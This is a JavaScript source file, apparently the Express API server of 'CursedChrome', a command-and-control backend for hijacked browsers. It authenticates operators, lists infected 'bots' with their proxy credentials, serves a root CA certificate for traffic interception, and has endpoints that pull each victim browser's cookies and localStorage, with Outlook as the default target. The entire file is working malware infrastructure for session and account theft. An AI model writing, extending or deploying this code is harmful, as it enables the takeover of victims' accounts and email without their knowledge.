'use strict';

const express  = require('express');
const bcrypt   = require('bcrypt');
const sessions = require('client-sessions');

const { Users, Bots, Settings } = require('./database');
const { get_hashed_password }   = require('./utils');

const API = '/api/v1';

async function get_api_server({ get_browser_cookies, get_browser_localstorage }) {
    const app = express();
    app.use(express.json());

    const secret_setting = await Settings.findOne({ where: { key: 'SESSION_SECRET' } });
    if (!secret_setting) throw new Error('SESSION_SECRET not set in database');

    app.use((_req, res, next) => {
        res.set('X-Content-Type-Options', 'nosniff');
        res.set('X-Frame-Options', 'DENY');
        res.set('X-XSS-Protection', 'mode=block');
        next();
    });

    app.use(sessions({
        cookieName: 'session',
        secret: secret_setting.value,
        duration:       7 * 24 * 60 * 60 * 1000,
        activeDuration:      5 * 60 * 1000,
        cookie: { ephemeral: true, httpOnly: true, secure: false },
    }));

    // Serve the admin panel from gui/index.html
    app.use('/', express.static('/work/gui/', {
        setHeaders(res) {
            res.set('Content-Security-Policy',
                "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'");
        },
    }));

    // Auth middleware (all API routes except these)
    const PUBLIC_ROUTES = [
        `${API}/login`,
        `${API}/verify-proxy-credentials`,
        `${API}/get-bot-browser-cookies`,
        `${API}/get-bot-localstorage`,
        '/health',
    ];

    app.use(async (req, res, next) => {
        if (!req.path.startsWith(API) || PUBLIC_ROUTES.includes(req.path)) return next();

        res.set('Content-Security-Policy', "default-src 'none'");
        res.set('Content-Type', 'application/json');

        if (!req.session.user_id) {
            return res.status(200).json({ success: false, error: 'Authentication required.', code: 'NOT_AUTHENTICATED' });
        }
        const user = await Users.findOne({ where: { id: req.session.user_id } });
        if (!user) {
            return res.status(200).json({ success: false, error: 'Authentication required.', code: 'NOT_AUTHENTICATED' });
        }
        req.user = { id: user.id, username: user.username, password_should_be_changed: user.password_should_be_changed };
        next();
    });

    // ── Routes ───────────────────────────────────────────────────────────────

    app.get('/health', (_req, res) => res.json({ success: true }));

    app.post(`${API}/login`, async (req, res) => {
        const { username, password } = req.body || {};
        if (!username || !password) {
            return res.status(400).json({ success: false, error: 'username and password required.' });
        }
        const user = await Users.findOne({ where: { username } });
        if (!user || !(await bcrypt.compare(password, user.password))) {
            return res.status(200).json({ success: false, error: 'Invalid credentials.', code: 'INVALID_CREDENTIALS' });
        }
        req.session.user_id = user.id;
        res.json({ success: true, result: { username: user.username, password_should_be_changed: user.password_should_be_changed } });
    });

    app.get(`${API}/logout`, (req, res) => {
        req.session.user_id = null;
        res.json({ success: true, result: {} });
    });

    app.get(`${API}/me`, (req, res) => {
        res.json({ success: true, result: { username: req.user.username, password_should_be_changed: req.user.password_should_be_changed } });
    });

    app.get(`${API}/bots`, async (_req, res) => {
        const bots = await Bots.findAll({
            attributes: ['id', 'is_online', 'name', 'proxy_password', 'proxy_username', 'user_agent', 'updatedAt', 'createdAt'],
        });
        res.json({ success: true, result: { bots } });
    });

    app.put(`${API}/bots`, async (req, res) => {
        const { bot_id, name } = req.body || {};
        if (!bot_id || !name) return res.status(400).json({ success: false, error: 'bot_id and name required.' });
        const bot = await Bots.findOne({ where: { id: bot_id } });
        if (!bot) return res.status(404).json({ success: false, error: 'Bot not found.' });
        await bot.update({ name });
        res.json({ success: true, result: {} });
    });

    app.put(`${API}/password`, async (req, res) => {
        const { new_password } = req.body || {};
        if (!new_password) return res.status(400).json({ success: false, error: 'new_password required.' });
        const user = await Users.findOne({ where: { id: req.session.user_id } });
        await user.update({ password: await get_hashed_password(new_password), password_should_be_changed: false });
        res.json({ success: true, result: {} });
    });

    app.get(`${API}/download_ca`, (_req, res) => {
        res.download(`${__dirname}/ssl/rootCA.crt`, 'CursedChromeCA.crt');
    });

    app.post(`${API}/verify-proxy-credentials`, async (req, res) => {
        const { username, password } = req.body || {};
        const bot = await Bots.findOne({
            where: { proxy_username: username, proxy_password: password },
            attributes: ['id', 'is_online', 'name', 'user_agent'],
        });
        if (!bot) return res.json({ success: false, error: 'Invalid credentials.', code: 'INVALID_CREDENTIALS' });
        res.json({ success: true, result: { id: bot.id, is_online: bot.is_online, name: bot.name, user_agent: bot.user_agent } });
    });

    app.post(`${API}/get-bot-browser-cookies`, async (req, res) => {
        const { username, password } = req.body || {};
        const bot = await Bots.findOne({ where: { proxy_username: username, proxy_password: password } });
        if (!bot) return res.json({ success: false, error: 'Invalid credentials.', code: 'INVALID_CREDENTIALS' });
        try {
            const cookies = await get_browser_cookies(bot.browser_id);
            res.json({ success: true, result: { cookies } });
        } catch (e) {
            res.json({ success: false, error: e.message });
        }
    });

    app.post(`${API}/get-bot-localstorage`, async (req, res) => {
        const { username, password, origin } = req.body || {};
        const bot = await Bots.findOne({ where: { proxy_username: username, proxy_password: password } });
        if (!bot) return res.json({ success: false, error: 'Invalid credentials.' });
        try {
            const result = await get_browser_localstorage(bot.browser_id, origin || 'https://outlook.office.com');
            res.json({ success: true, result });
        } catch (e) {
            res.json({ success: false, error: e.message });
        }
    });

    // Global error handler
    app.use((err, _req, res, _next) => {
        console.error(err);
        res.status(500).json({ success: false, error: 'Internal server error.' });
    });

    return app;
}

module.exports = { get_api_server };
